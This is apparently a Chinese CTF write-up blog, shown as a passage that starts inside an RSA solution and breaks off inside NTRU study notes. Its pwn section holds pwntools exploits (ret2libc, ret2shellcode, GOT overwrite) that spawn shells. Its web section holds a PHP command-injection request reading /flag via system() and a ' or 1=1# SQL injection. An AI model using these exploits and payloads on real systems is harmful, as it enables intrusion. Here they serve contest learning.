51999725233581619348238930320668315462087635295211755849675812266270026439521805156908952855288255992098479180003264827305694330542325533165867427898010879823017054891520626992724274019277478717788189662456052796449734904215067032681345261878977193341769514961038309763898052908572726913209883965288047452751n = 68816697240190744603903822351423855593899797203703723038363240057913366227564780805815565183450516726498872118491739132110437976570592602837245705802946829337567674506561850972973663435358068441037127926802688722648016352967768929007662772115485020718202683004813042834036078650571763978066558718285783045969import RSAwienerHackerd=RSAwienerHacker.hack_RSA(e,n)flag += long_to_bytes(pow(c, d, n))print(flag)#Level 5:c = 1135954814335407362237156338232840769700916726653557860319741136149066730262056907097728029957898420630256832277578506404721904131425822963948589774909272408535427656986176833063600681390871582834223748797942203560505159946141171210061405977060061656807175913366911284450695116982731157917343650021723054666494528470413522258995220648163505549701953152705111304471498547618002847587649651689203632845303117282630095814054989963116013144483037051076441508388998829hint = 611144874477135520868450203622074557606421849009025270666985817360484127602945558050689975570970227439583312738313767886380304814871432558985582586031211416586296452510050692235459883608453661597776103386009579351911278185434163016083552988251266501525188362673472772346212970459561496301631587043106524741903627979311997541301471894670374945556313285203740782346029579923650160327646876967315182335114575921178144825057359851607166387868294019144940296084605930n = 1232865496850144050320992645475166723525103370117149219196294373695624167653495180701004894188767069545579706264513808335877905149818445940067870026924895990672091745229251935876434509430457142930654307044403355838663341948471348893414890261787326255632362887647279204029327042915224570484394917295606592360109952538313570951448278525753313335289675455996833500751672463525151201002407861423542656805624090223118747404488579783372944593022796321473618301206064979e = 0x10001tmp = pow(e, e, n)p = GCD((hint * tmp) % n - 1, n)print(p)q = n // (p * p)d = inverse(e, p * (p-1) * (q-1))flag += long_to_bytes(pow(c, d, n))print(flag) chaos 这是一道基础爆破题目，题目比较长，不要被吓到。已知k1,k2和k(a_1, timea1, b_1, timeb1, xc_1, yc_1)，就可以直接利用LC求miu和omiga。然后爆破下就行了。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import randomimport timek1, k2 = 3.967139695598587, 3.7926025078694305 k = [107, 99, 55, 198, 210, 56, 137, 44, 127, 25, 150, 113, 75, 215, 187, 132] c = [23, 84, 105, 111, 230, 105, 97, 50, 58, 61, 25, 97, 57, 21, 175, 77, 102, 138, 120, 17, 66, 172, 52, 178, 101, 221, 109, 126, 71, 149, 63, 32, 56, 6, 134, 255, 110, 57, 15, 20, 116]def init(): sum, r = 0, 1 for i in range(16): sum += k[i] r ^= k[i] a_1 = (sum/256) % 1 timea1 = 3 + int(1000 * a_1) % 30 b_1 = (r/256) timeb1 = 3 + int(1000 * b_1) % 30 xc_1 = a_1 * b_1 yc_1 = (a_1 + b_1) % 1 print(&#x27;k1, k2 = %r, %r&#x27;%(k1, k2)) print(&#x27;k = %r&#x27;%k) return (k1, k2), (a_1, timea1, b_1, timeb1, xc_1, yc_1)def LC(key, x, times, flags): (k1, k2) = key xn = [] xn.append(x) if flags: xn.append(1 - 2 * xn[0]**2) else: xn.append(k2 * xn[0]**3 + (1 - k2)*xn[0]) for i in range(times): assert xn[i]&gt;=-1 and xn[i]&lt;=1 and xn[i+1]&gt;=-1 and xn[i+1]&lt;=1 if flags: xn.append((1 - 2 * xn[i]**2)*(k1 * xn[i+1]**3 + (1 - k1)*xn[i+1])) else: xn.append((k2 * xn[i]**3 + (1 - k2)*xn[i])*(1 - 2 * xn[i+1]**2)) return xn[times + 1]def decrypt(key, data): flag = &#x27;&#x27; (k1, k2) = key (a_1, timea1, b_1, timeb1, xc_1, yc_1) = data miu, omiga = [], [] ta = timea1 tb = timeb1 for j in range(len(c)): miu.append(LC(key, a_1, ta, 1)) omiga.append(LC(key, b_1, tb, 0)) for tmp in range(33, 127): if c[j] == ((int(miu[-1] * 1000) + int(omiga[-1] * 1000)) ^ tmp) % 256: flag += chr(tmp) delta = c[j]/256 for i in range(3): y = (yc_1 + delta) % 1 y = k1 * y**3 + (1 - k1) * y x = xc_1 x = k2 * x**3 + (1 - k2) * x ta = 3 + int(1000 * x) % 30 tb = 3 + int(1000 * y) % 30 return flagkey, data = init()flag = decrypt(key, data)print(flag)#flag&#123;ii24nji9-8ckkpil1-5hiev3n6-1u24g07m&#125; Misc Yesec no drumsticks 1 qsdz's girlfriend 1 用ARCHPR爆破。19900101开始到20200101，得到20031201。 用搜索引擎图片识别。 flag{Hikari_20031201} Look my eyes SilentEye解密。 解码默认设置就行。 123ZmxhZ3tMMG9rX20zXzFuX215X2V5M3N9flag&#123;L0ok_m3_1n_my_ey3s&#125; EzSnake 这道题有两种做法，可以直接改class，也可以反编译出java文件。 反编译class，这也是我当时做法。首先用jd-gui打开，在actionPerformed函数中找到关键代码： 将ezsnake.jar改成ezsnake.zip，解压。用jclasslib打开GamePanel.class文件。找到以下位置。 将289行114改成1，保存。回到解压文件夹的根目录： 选中这个目录中三个文件夹，压缩成zip,后缀改成.jar。便可以运行了。吃一个就能够出结果： 我是放到ps里面补全的，其他工具也行。 ZmxhZ3tZMHVfNHJlXzBuZV9vTmVfMG5FX3N0NFJ9= flag{Y0u_4re_0ne_oNe_0nE_st4R} jd-gui输出src文件。然后用eclipse打开，修改114为1： 奇怪的音频。 这题也有两种做法，一种win和一种linux。 windows方法比较简单。mmsstv中RX模式，开着声音直接可以解出来，但是存在扫不出来的概率，前一天扫出来了，后一天可能就没有扫出来。 利用linux的qsstv。直接解会报错，所以我们需要先修改一下文件。 首先去buuctf找到[UTCTF2020]sstv这道题。用audacity打开同时打开这两个文件。 然后把这道”奇怪的音频“的波形复制到[UTCTF2020]sstv这道题音频的波形上，覆盖源波形，就可以用qsstv读取了。 Pwn 简单题就直接贴代码了。都是python3。 ret2text 123456789from pwn import *pop_rdi_ret = 0x4007d3ret = 0x400566#context(log_level=&#x27;debug&#x27;)p = process(&#x27;./pwn&#x27;)print(p.recv(timeout=1))payload = b&#x27;a&#x27; * 0x20 + b&#x27;b&#x27; * 8 + p64(ret) +p64(0x400708)p.sendline(payload)p.interactive() calc 这应该算misc题目吧。 123456789101112131415161718192021from pwn import *import rer = remote(&#x27;node4.buuoj.cn&#x27;, 25831)r.recvline()r.recvline()r.recvline()for i in range(100): s = r.recvline() Regex = r&#x27;(?=\\?).*?(?&lt;=\\=)&#x27; f = re.search(Regex,s.decode()) f = f.group()[1:-1] f = f.replace(&#x27;x&#x27;, &#x27;*&#x27;) ans = eval(f) r.sendline(str(ans).encode()) r.recvline()r.sendline(b&#x27;cat flag&#x27;)print(r.recvline(timeout=1))r.interactive() ret2libc 好多师傅讲的很明白了：https://blog.csdn.net/qq_40827990/article/details/86662079 123456789101112131415161718192021222324252627282930from pwn import *#0x0000000000400753 : pop rdi ; retelf=ELF(&#x27; pwn&#x27;)libc = ELF(&#x27;libc-2.31.so&#x27;)p=process(&#x27;./pwn&#x27;)puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]libc_system = libc.symbols[&#x27;system&#x27;]libc_sh = libc.search(b&#x27;/bin/sh&#x27;).__next__()libc_puts_addr = libc.symbols[&#x27;puts&#x27;]pop_rdi_ret = 0x400753start = 0x400698p.recvuntil(b&#x27;time?\\n&#x27;)payload = b&#x27;a&#x27; * 32 + b&#x27;b&#x27; * 8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)p.sendline(payload)print(p.recvline()) puts_addr = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))base_addr = puts_addr - libc_puts_addrsystem_addr = base_addr + libc_systemsh_addr = base_addr + libc_sh ret = 0x40050epayload = b&#x27;a&#x27; * 32 + b&#x27;b&#x27; * 8 + p64(ret) + p64(pop_rdi_ret) + p64(sh_addr) + p64(system_addr) + p64(start)p.sendline(payload)p.interactive() ret2shellcode 123456789101112from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)shellcode=asm(shellcraft.sh())print(len(shellcode))p = process(&quot;./pwn&quot;)p.recvline()p.sendline(shellcode)p.recvline()payload = 0x30 * b&#x27;a&#x27; + 8 * b&#x27;b&#x27; + p64(0x233000)p.sendline(payload)p.recvline()p.interactive() fallw1nd’s gift 给了got表中puts指向的地址，也就是libc中put地址。然后在scanf输入got表中puts地址的值，为buf，在buf上输入libc中system地址，puts就变成了system，执行system('/bin/sh'); 123456789101112131415161718192021222324252627282930from pwn import *context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)elf=ELF(&#x27;fallw1nd_gift&#x27;)libc = ELF(&#x27;libc-2.31.so&#x27;)libc_system = libc.symbols[&#x27;system&#x27;]libc_puts_addr = libc.symbols[&#x27;puts&#x27;]puts_plt=elf.plt[&#x27;puts&#x27;]puts_got=elf.got[&#x27;puts&#x27;]print(puts_plt)print(puts_got)#0x401084#0x4033f8p = process(&#x27;./fallw1nd_gift&#x27;)p.recvline()s = p.recvline().rstrip()p.recvline()puts_addr = int(s.decode(),16)p.sendline(b&#x27;0x4033f8&#x27;)print(p.recvline())base_addr = puts_addr - libc_puts_addrsystem_addr = base_addr + libc_systempayload = p64(system_addr)p.sendline(payload)p.interactive() Reverse Hello_Reverse 1234.rdata:0000000140003260 0000000D C flag&#123;h3llo_rstrcpy(Source, &quot;3vers1ng_w0rld&#125;&quot;);flag&#123;h3llo_r3vers1ng_w0rld&#125; Baby_Re 123456789flag = [#flag&#123;S0meth1ng_run_bef0re_main!&#125;0x66, 0x6D, 0x63, 0x64, 0x7F, 0x56, 54, 0x6A, 0x6D, 0x7D, 0x62, 58, 0x62, 0x6A, 0x51, 0x7D, 0x65, 0x7F, 0x4D, 0x71, 0x71, 0x73, 38, 0x65, 0x7D, 0x46, 0x77, 0x7A, 0x75, 0x73, 63, 0x62]flag_ = &quot;&quot;for i in range(len(flag)): flag_ += chr(flag[i] ^ i)print(flag_)#flag&#123;S0meth1ng_run_bef0re_main!&#125; Pyre exe to pyc: https://github.com/extremecoders-re/pyinstxtractor 12python pyinstxtractor.py pyre.exe 用010editor打开extracted文件夹下pyre和struct。将struct第一行复制到pyre中，保存pyre为pyre.pyc。 pyc to py: pip install uncompyle6 12uncompyle6 pyre.pyc &gt; pyre.py 后面的代码非常容易理解了，直接上exp: 123456789101112131415table = [7, 8, 1, 2, 4, 5, 13, 16, 20, 21, 0, 3, 22, 19, 6, 12, 11, 18, 9, 10, 15, 14, 17]dics = &#123;&#125;encode = &#x27;REla&#123;PSF!!fg&#125;!Y_SN_1_0U&#x27;flag = &#x27;&#x27;for i in range(len(table)): dics[table[i]] = encode[i]for i in range(len(table)): flag += dics[i]print(flag)#flag&#123;PYRE_1S_S0_FUN!!!&#125; EasyRe 找到dll中的encode函数，用ida进dll以后发现是encode_0函数，发现是base64。base64返回值做了一个异或加密，异或加密的str为‘Reverse’： exp: 12345678910111213141516enc = [ 0x08, 0x08, 0x0E, 0x0D, 0x28, 0x40, 0x11, 0x11, 0x3C, 0x2E, 0x2B, 0x1E, 0x3D, 0x0F, 0x00, 0x03, 0x3B, 0x3D, 0x3C, 0x15, 0x28, 0x05, 0x50, 0x46, 0x3F, 0x2A, 0x39, 0x09, 0x31, 0x56, 0x24, 0x1C, 0x3F, 0x24, 0x50, 0x3C, 0x2C, 0x25, 0x23, 0x4B]c = b&#x27;Reverse&#x27;c = list(c)print(c)base = [enc[i] ^ c[i % len(c)] for i in range(len(enc))]print(bytes(base))base = bytes(base)import base64flag = base64.b64decode(base.decode())print(flag)#flag&#123;Base64_1s_1nterestr1ng!!&#125; 艾克体悟题 我的安卓题做的不好，而且我比较懒= =开安卓模拟器需要把windows各种虚拟机关掉，我心爱的wsl2用不了实在是不好受= =还是看其他师傅写好的wp吧：https://www.anyiblog.top/2022/09/25/20220925/ Web HTTP 1234567#linux的curl语句，wsl2中做题记录,wsl2会自动加上&quot;\\&quot;，不用管：curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/?name=1curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/?name=1 -X POST -d &#x27;key=ctfisgood&#x27;curl http://f8c735fa-c209-437b-a2b4-4b6c44c489a9.node4.buuoj.cn:81/?name=1 -X POST -d &#x27;key=ctfisgood&#x27; -H &#x27;cookie:user=admin&#x27;#flag&#123;&#125; Head?Header! 12345curl node4.buuoj.cn:28006 -H &#x27;User-Agent:CTF&#x27; -vcurl node4.buuoj.cn:28006 -H &#x27;User-Agent:CTF&#x27; -H &#x27;Referer:ctf.com&#x27; -vcurl node4.buuoj.cn:28006 -H &#x27;User-Agent:CTF&#x27; -H &#x27;Referer:ctf.com&#x27; -H &#x27;X-Forwarded-For:127.0.0.1&#x27; -v#flag&#123;&#125; 我真的会谢 题目提示： 123Flag has three part, qsdz hid them in different files.By the way, these files are sensitive. 在不同的文件里面，那么我么需要这些文件。dirsearch不能直接扫描buu的题目了，但其实延迟的参数就可以了。我的环境是wsl的kali： 12dirsearch -u http://e4e77030-f04f-4879-835d-1d3e838f7007.node4.buuoj.cn:81/ -s 5 1234wget http://84bb312a-45f4-422d-a658-41aeacc1b243.node4.buuoj.cn:81/.index.php.swpvim .index.php.swp#part_two 另外两个在robots.txt和www.zip里面。 NotPHP 第一步，php伪协议： 12data://text/plain;base64,V2VsY29tZSB0byBDVEY= 第二步，利用md5的碰撞，两个字符串不一样但是加密相等。 https://blog.csdn.net/qq_64201116/article/details/126493091里面提供了一个字符串。 1234$a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2$b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2 第三步，num可以在结尾添加%00绕过。 第四步，cmd用%0a换行符绕过#。 12cmd=%0asystem(&#x27;cat%20/flag&#x27;); burpsuite包： 1234567891011121314POST /?data=data://text/plain;base64,V2VsY29tZSB0byBDVEY=&amp;key1=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2&amp;key2=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;cmd=%0asystem(&#x27;cat%20/flag&#x27;); HTTP/1.1Host: d384d440-c395-4839-a541-026d7937b84d.node4.buuoj.cn:81Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 11num=2077%00 Word-For-You 直接用sqlmap了。 12用&#x27; or 1=1#试了一下就都出来了。","categories":[{"name":"match","slug":"match","permalink":"https://feverhu.github.io/categories/match/"}],"tags":[{"name":"RSA","slug":"RSA","permalink":"https://feverhu.github.io/tags/RSA/"},{"name":"php","slug":"php","permalink":"https://feverhu.github.io/tags/php/"},{"name":"python","slug":"python","permalink":"https://feverhu.github.io/tags/python/"}]},{"title":"NTRU","slug":"NTRU","date":"2022-09-16T12:56:51.000Z","updated":"2022-10-29T14:59:59.202Z","comments":true,"path":"2022/09/16/NTRU/","link":"","permalink":"https://feverhu.github.io/2022/09/16/NTRU/","excerpt":"","text":"原理等来自相关链接：NTRU-密码学|NTRU算法|wiki-NTRUEncrypt 简介 初始化生成和公钥 Encryption Decryption Dasctf 2022 July — esayNTRU 题目 解题思路 NTRUrsa 题目 题解 wiki-NTRUEncrypt 截图 简介 算法流程如下： 初始化生成和公钥 初始化(N, p , q, d) N：次数参数，为正整数。经典取值为素数n=251。 q：大模数，为正整数。经典取值为2的幂q=256。 p：小模数，为小的奇素数或多项式。经典取值为素数p=3。 d：用来限制非0系数的个数，为整数。当n=251时，d=72。 NTRU原始方案的一个说明： 中心化处理，即模q运算或模p运算的结果以0为中心。比如模3运算的结果属于{-1，0，1}而不是{0，1，2}，模256运算的结果属于{-127，-126，…，128}而不是{0，1…，255}。这样的中心化处理在代数上没有任何不同，但使得尺寸变小了。环和环都经过这样的中心化处理。 此篇不做。 生成公钥： 生成两个次数为N - 1的多项式、 ，他们的系数为{-1, 0, 1}。 例，N = 10, p = 3, q = 512, d = 3时(N, p, q, d) = (10, 3, 512, 3): 1234567891011121314R.&lt;x&gt; = ZZ[]def T(d1, d2): assert N &gt;= d1+d2 s = [1]*d1 + [-1]*d2 + [0]*(N-d1-d2) shuffle(s) return R(s) f = T(d+1, d)g = T(d, d)print(\"f = \", f)# f = x^7 + x^6 + x^5 + x^4 - x^2 - x - 1print(\"g = \", g)# g = -x^9 + x^5 + x^4 - x^2 - x + 1 和可以看作是模多项式的剩余类的表示。同时，系数在mod p情况下，满足;系数在模mod q情况下，满足。 公钥h满足： 12345678910111213141516171819202122232425262728293031323334def polyMod(f, q): g = [f[i]%q for i in range(N)] return R(g) def liftMod(f, q): g = list(((f[i] + q//2) % q) - q//2 for i in range(N)) return R(g)def invertModPrime(f, p): Rp = R.change_ring(Integers(p)).quotient(x^N-1) return R(lift(1 / Rp(f)))def invertModPow2(f, q): assert q.is_power_of(2) g = invertModPrime(f,2) while True: r = liftMod(convolution(g,f),q) if r == 1: return g g = liftMod(convolution(g,2 - r),q)def convolution(f, g): return (f*g) % (x^N-1)Fp = polyMod(invertModPrime(f, p), p)Fq = polyMod(invertModPow2(f, q), q)h = polyMod(convolution(Fq, g), q)print(\"Fp = \", Fp)# Fp = 2*x^9 + 2*x^8 + 2*x^6 + 2*x^5 + x^4 + x^3 + 2*x + 1print(\"Fq = \", Fq)# Fq = 419*x^9 + 465*x^8 + 233*x^7 + 373*x^6 + 186*x^5 + 93*x^4 + 47*x^3 + 279*x^2 + 140*x + 326print(\"h = \", h)# h = 186*x^9 + 92*x^8 + 47*x^7 + 280*x^6 + 139*x^5 + 326*x^4 + 419*x^3 + 464*x^2 + 234*x + 373# 并不是所有的f，g都可以生成h。因为f很可能在上述模下没有逆。所以最好这两段代码应该用try封装，并封入genKey()的函数。 至此，公钥h产生。私钥为 Encryption 是0一个随机多项式。 加密方式为： 是密文，m是明文。 123def encrypt(m, h): e = liftMod(p*convolution(h, T(d, d)) + m, q) return e Decryption Dasctf 2022 July — esayNTRU 题目 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from Crypto.Hash import SHA3_256from Crypto.Cipher import AESfrom Crypto.Util.Padding import padfrom secret import flag# parametersN = 10p = 3q = 512d = 3assert q&gt;(6*d+1)*pR.&lt;x&gt; = ZZ[]#d1 1s and #d2 -1sdef T(d1, d2): assert N &gt;= d1+d2 s = [1]*d1 + [-1]*d2 + [0]*(N-d1-d2) shuffle(s) return R(s)def invertModPrime(f, p): Rp = R.change_ring(Integers(p)).quotient(x^N-1) return R(lift(1 / Rp(f)))def convolution(f, g): return (f*g) % (x^N-1)def liftMod(f, q): g = list(((f[i] + q//2) % q) - q//2 for i in range(N)) return R(g)def polyMod(f, q): g = [f[i]%q for i in range(N)] return R(g)def invertModPow2(f, q): assert q.is_power_of(2) g = invertModPrime(f,2) while True: r = liftMod(convolution(g,f),q) if r == 1: return g g = liftMod(convolution(g,2 - r),q)def genMessage(): result = list(randrange(p) - 1 for j in range(N)) return R(result)def genKey(): while True: try: f = T(d+1, d) g = T(d, d) Fp = polyMod(invertModPrime(f, p), p) Fq = polyMod(invertModPow2(f, q), q) break except: continue h = polyMod(convolution(Fq, g), q) return h, (f, g)def encrypt(m, h): e = liftMod(p*convolution(h, T(d, d)) + m, q) return e# Step 1h, secret = genKey()m = genMessage()e = encrypt(m, h)print('h = %s' % h)print('e = %s' % e)# Step 2sha3 = SHA3_256.new()sha3.update(bytes(str(m).encode('utf-8')))key = sha3.digest()cypher = AES.new(key, AES.MODE_ECB)c = cypher.encrypt(pad(flag, 32))print('c = %s' % c)h = 39*x^9 + 60*x^8 + 349*x^7 + 268*x^6 + 144*x^5 + 469*x^4 + 449*x^3 + 165*x^2 + 248*x + 369e = -144*x^9 - 200*x^8 - 8*x^7 + 248*x^6 + 85*x^5 + 102*x^4 + 167*x^3 + 30*x^2 - 203*x - 78c = b'\\xb9W\\x8c\\x8b\\x0cG\\xde\\x7fl\\xf7\\x03\\xbb9m\\x0c\\xc4L\\xfe\\xe9Q\\xad\\xfd\\xda!\\x1a\\xea@}U\\x9ay4\\x8a\\xe3y\\xdf\\xd5BV\\xa7\\x06\\xf9\\x08\\x96=\"f\\xc1\\x1b\\xd7\\xdb\\xc1j\\x82F\\x0b\\x16\\x06\\xbcJMB\\xc8\\x80' 解题思路 因为m较小，可以直接爆破m。exp: 123456789101112131415161718#sagefrom Crypto.Hash import SHA3_256from Crypto.Cipher import AESc = b'\\xb9W\\x8c\\x8b\\x0cG\\xde\\x7fl\\xf7\\x03\\xbb9m\\x0c\\xc4L\\xfe\\xe9Q\\xad\\xfd\\xda!\\x1a\\xea@}U\\x9ay4\\x8a\\xe3y\\xdf\\xd5BV\\xa7\\x06\\xf9\\x08\\x96=\"f\\xc1\\x1b\\xd7\\xdb\\xc1j\\x82F\\x0b\\x16\\x06\\xbcJMB\\xc8\\x80'R.&lt;x&gt; = ZZ[]import itertoolst = [1, 0, -1]for i in itertools.product(t,repeat=10): m = list(i) m = R(m) sha3 = SHA3_256.new() sha3 = sha3.update(bytes(str(m).encode('utf-8'))) key = sha3.digest() cypher = AES.new(key, AES.MODE_ECB) m = cypher.decrypt(c) if b'DASCTF' in m: print(m) 格基规约 参考资料： LatticeHacks 和 2022DASCTF7月赋能赛CryptoWriteup 因为参数小的原因，也可以用格来求出m。首先根据定义。 我们造格只需要制造，已知。 1234#sageIntegers(q)(1/3)# output: 171h3 = (171*h)%q ​ 的构造如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#sageimport randomfrom Crypto.Util.number import *Zx.&lt;x&gt; = ZZ[]# R.&lt;x&gt; = ZZ[]def balancedmod(f,q): g = list( ((f[i] + q//2) % q) - q//2 for i in range(n) ) return Zx(g)def cyclicconvolution(f, g): return (f*g) % (x^n-1)def invertmodprime(f,p): T = Zx.change_ring(Integers(p)).quotient(x^n-1) return Zx(lift(1 / T(f)))def invertmodpowerof2(f,q): assert q.is_power_of(2) g = invertmodprime(f,2) while True: r = balancedmod(cyclicconvolution(g,f),q) if r == 1: return g g = balancedmod(cyclicconvolution(g,2 - r),q)def encrypt(message, publickey): r = rpoly() return balancedmod(cyclicconvolution(publickey, r) + message, q)def decrypt(cipher,f,fp): # cipher=Zx(cipher) a=balancedmod(cyclicconvolution(f, cipher), q) m=balancedmod(cyclicconvolution(fp, a),p) return mdef attack(publickey): recip3 = lift(1/Integers(q)(3)) publickeyover3 = balancedmod(recip3 * publickey,q) M = matrix(2 * n) for i in range(n): M[i,i] = q for i in range(n): M[i+n,i+n] = 1 c = cyclicconvolution(x^i,publickeyover3) for j in range(n): M[i+n,j] = c[j] M = M.LLL() for j in range(2 * n): try: f = Zx(list(M[j][n:])) f3 = invertmodprime(f,3) return (f,f3) except:pass return (f,f)n = 10p = 3q = 512d = 3assert q&gt;(6*d+1)*ph = 39*x^9 + 60*x^8 + 349*x^7 + 268*x^6 + 144*x^5 + 469*x^4 + 449*x^3 + 165*x^2 + 248*x + 369e = -144*x^9 - 200*x^8 - 8*x^7 + 248*x^6 + 85*x^5 + 102*x^4 + 167*x^3 + 30*x^2 - 203*x - 78c = b'\\xb9W\\x8c\\x8b\\x0cG\\xde\\x7fl\\xf7\\x03\\xbb9m\\x0c\\xc4L\\xfe\\xe9Q\\xad\\xfd\\xda!\\x1a\\xea@}U\\x9ay4\\x8a\\xe3y\\xdf\\xd5BV\\xa7\\x06\\xf9\\x08\\x96=\"f\\xc1\\x1b\\xd7\\xdb\\xc1j\\x82F\\x0b\\x16\\x06\\xbcJMB\\xc8\\x80'# publickey,secretkey = keypair()donald = attack(h.coefficients(sparse=False))m = decrypt(e,donald[0],donald[1])from Crypto.Hash import SHA3_256from Crypto.Cipher import AESsha3 = SHA3_256.new()sha3.update(bytes(str(Zx(m)).encode('utf-8')))key = sha3.digest()cipher = AES.new(key, AES.MODE_ECB)flag = cipher.decrypt(c)print('c = %s' % flag) NTRUrsa 题目 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from Crypto.Util.number import *from gmpy2 import *from secret import flagdef gen(): p1 = getPrime(256) while True: f = getRandomRange(1, iroot(p1 // 2, 2)[0]) g = getRandomRange(iroot(p1 // 4, 2)[0], iroot(p1 // 2, 2)[0]) if gcd(f, p1) == 1 and gcd(f, g) == 1 and isPrime(g) == 1: break rand = getRandomRange(0, 2 ^ 20) g1 = g ^^ rand h = (inverse(f, p1) * g1) % p1 return h, p1, g, f, g1def gen_irreducable_poly(deg): while True: out = R.random_element(degree=deg) if out.is_irreducible(): return outh, p1, g, f, g1 = gen()q = getPrime(1024)n = g * q e = 0x10001c1 = pow(bytes_to_long(flag), e, n)hint = list(str(h))length = len(hint)bits = 16p2 = random_prime(2 ^ bits - 1, False, 2 ^ (bits - 1))R.&lt;x&gt; = PolynomialRing(GF(p2))P = gen_irreducable_poly(ZZ.random_element(length, 2 * length))Q = gen_irreducable_poly(ZZ.random_element(length, 2 * length))N = P * QS.&lt;x&gt; = R.quotient(N)m = S(hint)c2 = m ^ eprint(\"p1 =\", p1)print(\"c1 =\", c1)print(\"p2 =\", p2)print(\"c2 =\", c2)print(\"n =\", n)print(\"N =\", N)'''p1 = 106472061241112922861460644342336453303928202010237284715354717630502168520267c1 = 20920247107738496784071050239422540936224577122721266141057957551603705972966457203177812404896852110975768315464852962210648535130235298413611598658659777108920014929632531307409885868941842921815735008981335582297975794108016151210394446009890312043259167806981442425505200141283138318269058818777636637375101005540308736021976559495266332357714p2 = 64621c2 = 19921*x^174 + 49192*x^173 + 18894*x^172 + 61121*x^171 + 50271*x^170 + 11860*x^169 + 53128*x^168 + 38658*x^167 + 14191*x^166 + 9671*x^165 + 40879*x^164 + 15187*x^163 + 33523*x^162 + 62270*x^161 + 64211*x^160 + 54518*x^159 + 50446*x^158 + 2597*x^157 + 32216*x^156 + 10500*x^155 + 63276*x^154 + 27916*x^153 + 55316*x^152 + 30898*x^151 + 43706*x^150 + 5734*x^149 + 35616*x^148 + 14288*x^147 + 18282*x^146 + 22788*x^145 + 48188*x^144 + 34176*x^143 + 55952*x^142 + 9578*x^141 + 9177*x^140 + 22083*x^139 + 14586*x^138 + 9748*x^137 + 21118*x^136 + 155*x^135 + 64224*x^134 + 18193*x^133 + 33732*x^132 + 38135*x^131 + 51992*x^130 + 8203*x^129 + 8538*x^128 + 55203*x^127 + 5003*x^126 + 2009*x^125 + 45023*x^124 + 12311*x^123 + 21428*x^122 + 24110*x^121 + 43537*x^120 + 21885*x^119 + 50212*x^118 + 40445*x^117 + 17768*x^116 + 46616*x^115 + 4771*x^114 + 20903*x^113 + 47764*x^112 + 13056*x^111 + 50837*x^110 + 22313*x^109 + 39698*x^108 + 60377*x^107 + 59357*x^106 + 24051*x^105 + 5888*x^104 + 29414*x^103 + 31726*x^102 + 4906*x^101 + 23968*x^100 + 52360*x^99 + 58063*x^98 + 706*x^97 + 31420*x^96 + 62468*x^95 + 18557*x^94 + 1498*x^93 + 17590*x^92 + 62990*x^91 + 27200*x^90 + 7052*x^89 + 39117*x^88 + 46944*x^87 + 45535*x^86 + 28092*x^85 + 1981*x^84 + 4377*x^83 + 34419*x^82 + 33754*x^81 + 2640*x^80 + 44427*x^79 + 32179*x^78 + 57721*x^77 + 9444*x^76 + 49374*x^75 + 21288*x^74 + 44098*x^73 + 57744*x^72 + 63457*x^71 + 43300*x^70 + 1508*x^69 + 13775*x^68 + 23197*x^67 + 43070*x^66 + 20751*x^65 + 47479*x^64 + 18496*x^63 + 53392*x^62 + 10387*x^61 + 2317*x^60 + 57492*x^59 + 25441*x^58 + 52532*x^57 + 27150*x^56 + 33788*x^55 + 43371*x^54 + 30972*x^53 + 39583*x^52 + 36407*x^51 + 35564*x^50 + 44564*x^49 + 1505*x^48 + 47519*x^47 + 38695*x^46 + 43107*x^45 + 1676*x^44 + 42057*x^43 + 49879*x^42 + 29083*x^41 + 42241*x^40 + 8853*x^39 + 33546*x^38 + 48954*x^37 + 30352*x^36 + 62020*x^35 + 39864*x^34 + 9519*x^33 + 24828*x^32 + 34696*x^31 + 2387*x^30 + 27413*x^29 + 55829*x^28 + 40217*x^27 + 30205*x^26 + 42328*x^25 + 6210*x^24 + 52442*x^23 + 58495*x^22 + 2014*x^21 + 26452*x^20 + 33547*x^19 + 19840*x^18 + 5995*x^17 + 16850*x^16 + 37855*x^15 + 7221*x^14 + 32200*x^13 + 8121*x^12 + 23767*x^11 + 46563*x^10 + 51673*x^9 + 19372*x^8 + 4157*x^7 + 48421*x^6 + 